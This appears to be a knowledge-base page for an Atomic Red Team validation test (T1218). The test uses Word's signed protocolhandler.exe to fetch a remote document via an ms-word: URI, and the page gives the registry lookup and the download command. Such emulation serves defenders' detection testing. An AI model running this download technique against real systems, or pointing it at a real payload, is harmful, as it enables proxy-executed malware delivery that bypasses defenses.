---
atomic_guid: "db020456-125b-4c8b-a4a7-487df8afb5a2"
title: "ProtocolHandler.exe Downloaded a Suspicious File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218"
attack_technique_name: "Signed Binary Proxy Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "db020456-125b-4c8b-a4a7-487df8afb5a2"
  - "ProtocolHandler.exe Downloaded a Suspicious File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# ProtocolHandler.exe Downloaded a Suspicious File

Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.

## Metadata

- Atomic GUID: db020456-125b-4c8b-a4a7-487df8afb5a2
- Technique: T1218: Signed Binary Proxy Execution
- Platforms: windows
- Executor: command_prompt
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1218/T1218.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Input Arguments

### remote_url

- description: url to document
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx

## Dependencies

Microsoft Word must be installed

### Prerequisite Check

```powershell
try {
  $wdApp = New-Object -COMObject "Word.Application"
  Stop-Process -Name "winword"
  exit 0 } catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml)
